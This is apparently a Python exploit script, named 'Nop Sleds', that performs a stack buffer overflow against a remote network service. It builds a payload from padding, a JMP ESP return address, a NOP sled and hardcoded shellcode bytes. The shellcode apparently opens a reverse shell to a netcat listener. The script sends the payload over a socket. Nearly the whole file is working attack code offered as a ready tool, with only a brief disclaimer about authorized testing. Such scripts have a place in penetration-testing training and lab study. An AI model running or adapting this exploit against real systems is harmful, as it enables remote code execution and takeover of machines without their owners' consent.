#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
import struct
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int, jmp_address: hex) -> None:
	if eip_offset > overflow_threshold:
		print("The value of the offset cannot be bigger than the overflow threshold")
		sys.exit(0)
	
	# Define prefix and buffer with encoded cyclic pattern
	prefix = b""	# CHANGE
	buffer = b"A" * eip_offset
	eip = struct.pack('<I', jmp_address) # Transforms 0x625011AF into \xAF\x11\x50\x62
	shellcode =  b""
	shellcode += b"\xdb\xd5\xd9\x74\x24\xf4\x5e\x33\xc9\xba\xb3"
	shellcode += b"\x36\x73\x02\xb1\x12\x83\xc6\x04\x31\x56\x13"
	shellcode += b"\x03\xe5\x25\x91\xf7\x38\x91\xa2\x1b\x69\x66"
	shellcode += b"\x1e\xb6\x8f\xe1\x41\xf6\xe9\x3c\x01\x64\xac"
	shellcode += b"\x0e\x3d\x46\xce\x26\x3b\xa1\xa6\xb2\xb0\x47"
	shellcode += b"\xab\xab\xc4\x67\xc2\x77\x40\x86\x54\xe1\x02"
	shellcode += b"\x18\xc7\x5d\xa1\x13\x06\x6c\x26\x71\xa0\x01"
	shellcode += b"\x08\x05\x58\xb6\x79\xc6\xfa\x2f\x0f\xfb\xa8"
	shellcode += b"\xfc\x86\x1d\xfc\x08\x54\x5d"
	nops = b"\x90" * 16 

	payload = b""
	payload_size = eip_offset + len(eip) + len(shellcode) + len(nops)

	if payload_size > overflow_threshold:
		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip) + len(shellcode) + len(nops))
		sys.exit(0)

	suffix = b"C" * (overflow_threshold - payload_size)

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				while True:
					response = s.recv(4096)
					print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					nops,
					shellcode,
					suffix
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(payload)
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Nop Sleds",
		description="""This is a Python script for executing a buffer overflow on a target service of a remote server. 
	The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address of the JUMP ESP intruction which does not have correct protection applied. 
	After launching a local netcat listener to the port described in the payload we should be able to get a shell on the target server.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	parser.add_argument("jmp_esp", help="Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold), int(args.jmp_esp,16))